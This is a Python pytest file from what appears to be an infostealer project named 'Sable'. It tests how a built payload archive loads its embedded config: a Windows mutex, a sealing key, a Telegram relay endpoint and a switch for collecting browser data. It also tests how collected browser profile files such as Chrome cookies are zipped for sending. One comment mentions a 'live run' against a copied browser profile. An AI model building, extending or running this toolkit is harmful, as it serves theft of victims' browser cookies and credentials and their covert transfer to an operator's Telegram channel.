"""The agent reading its config out of the archive it is running from.

This is the one path that cannot be exercised by importing ``core.schema``: on a target
the schema is not an import, it is a member inside the zip, exec'd into a module that
did not exist a moment ago. A test that only imports the original would keep passing
while every built artifact rejected its own config.
"""

from __future__ import annotations

import io
import os
import sys
import zipfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent import config, util  # noqa: E402
from core import forge  # noqa: E402
from core.schema import (  # noqa: E402
    SCHEMA_VERSION,
    RelayConfig,
    RunConfig,
    SourceConfig,
    to_dict,
)


def sample() -> RunConfig:
    return RunConfig(
        schema_version=SCHEMA_VERSION,
        mutex="Global\\SableArchiveTest",
        seal_key="k-archive-test",
        relay=RelayConfig(kind="telegram", endpoint="123456789:secret$42"),
        sources=SourceConfig(system=False, browsers=True),
    )


@pytest.fixture(autouse=True)
def fresh_schema() -> None:
    """The loader caches the schema module; each test starts from nothing."""
    config._schema = None
    sys.modules.pop(config.SCHEMA_MEMBER.removesuffix(".py"), None)


def archive_for(cfg: RunConfig) -> zipfile.ZipFile:
    return zipfile.ZipFile(io.BytesIO(forge.payload(ROOT, cfg)))


def test_schema_member_execs_and_registers_itself() -> None:
    # The failure this guards: ``from __future__ import annotations`` makes every
    # annotation a string, and ``dataclasses`` resolves those strings through
    # sys.modules while it processes each class. Registered after the exec instead of
    # before, the lookup returns None and the decorator raises AttributeError.
    cfg = sample()
    with archive_for(cfg) as archive:
        loaded = config.load(archive)

    # The shipped schema is a second copy of the dataclasses, so its RunConfig is a
    # different class object and ``==`` would compare identity. The fields are the
    # contract, so the comparison goes through its own ``to_dict``.
    assert to_dict(loaded) == to_dict(cfg)
    assert "sable_schema" in sys.modules


def test_loads_from_a_real_archive() -> None:
    cfg = sample()
    with archive_for(cfg) as archive:
        loaded = config.load(archive)

    assert loaded.schema_version == SCHEMA_VERSION
    assert loaded.relay.kind == "telegram"
    assert loaded.sources.system is False
    assert loaded.sources.browsers is True


def test_the_schema_inside_the_archive_is_the_copy_that_wins() -> None:
    # A stale module already in sys.modules must not stand in for the shipped copy.
    sys.modules["sable_schema"] = type(sys)("sable_schema")

    cfg = sample()
    with archive_for(cfg) as archive:
        loaded = config.load(archive)

    assert to_dict(loaded) == to_dict(cfg)


def test_missing_schema_member_is_named() -> None:
    with zipfile.ZipFile(io.BytesIO(b""), "w") as archive:
        archive.writestr(forge.CONFIG_MEMBER, "{}")
        archive.fp.seek(0)
        with pytest.raises(config.ConfigLoadError) as caught:
            config.load(archive)
    assert config.SCHEMA_MEMBER in str(caught.value)


def test_missing_config_member_is_named() -> None:
    cfg = sample()
    payload = forge.payload(ROOT, cfg)
    buffer = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(payload)) as original, zipfile.ZipFile(buffer, "w") as bare:
        for name in original.namelist():
            if name != forge.CONFIG_MEMBER:
                bare.writestr(name, original.read(name))
    buffer.seek(0)

    with zipfile.ZipFile(buffer) as archive, pytest.raises(config.ConfigLoadError) as caught:
        config.load(archive)
    assert config.CONFIG_MEMBER in str(caught.value)


def test_malformed_config_json_raises_the_schema_error() -> None:
    cfg = sample()
    payload = forge.payload(ROOT, cfg)
    buffer = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(payload)) as original, zipfile.ZipFile(buffer, "w") as broken:
        for name in original.namelist():
            data = original.read(name)
            broken.writestr(name, b"{not json" if name == forge.CONFIG_MEMBER else data)
    buffer.seek(0)

    # The exec'd schema declares its own ConfigError, so this cannot be caught by type
    # against ``core.schema``'s. What matters is that it reaches the caller at all and
    # that it names the member.
    with zipfile.ZipFile(buffer) as archive, pytest.raises(Exception) as caught:
        config.load(archive)

    assert type(caught.value).__name__ == "ConfigError"
    assert caught.value.path == "cfg.json"


def test_a_broken_schema_member_does_not_stay_registered() -> None:
    with zipfile.ZipFile(io.BytesIO(b""), "w") as archive:
        archive.writestr(config.SCHEMA_MEMBER, "def broken(:\n")
        archive.fp.seek(0)
        with pytest.raises(config.ConfigLoadError):
            config.load(archive)

    assert "sable_schema" not in sys.modules


# --- archive assembly -------------------------------------------------------


def test_archive_survives_a_file_from_before_1980(tmp_path: Path) -> None:
    # A copied browser profile carries 1601-epoch files, which is Windows' zero. The
    # zip format starts at 1980 and ``ZipFile.write`` raises ValueError on anything
    # older, taking the whole archive down. Found by a live run, not by a fixture.
    collected = tmp_path / "collected"
    collected.mkdir()
    (collected / "modern.txt").write_bytes(b"fine")
    ancient = collected / "ancient.bin"
    ancient.write_bytes(b"older than the format")
    os.utime(ancient, (0, 0))

    destination = tmp_path / "out" / "payload.zip"
    written = util.make_archive(collected, destination)

    assert written == destination
    with zipfile.ZipFile(destination) as archive:
        assert sorted(archive.namelist()) == ["ancient.bin", "modern.txt"]
        assert archive.read("ancient.bin") == b"older than the format"
        assert archive.getinfo("ancient.bin").date_time == (1980, 1, 1, 0, 0, 0)


def test_archive_holds_its_members_under_their_relative_paths(tmp_path: Path) -> None:
    collected = tmp_path / "collected"
    (collected / "browsers" / "chrome" / "Default").mkdir(parents=True)
    (collected / "browsers" / "chrome" / "Default" / "cookies.json").write_bytes(b"[]")

    destination = tmp_path / "payload.zip"
    assert util.make_archive(collected, destination) == destination
    with zipfile.ZipFile(destination) as archive:
        assert archive.namelist() == ["browsers/chrome/Default/cookies.json"]
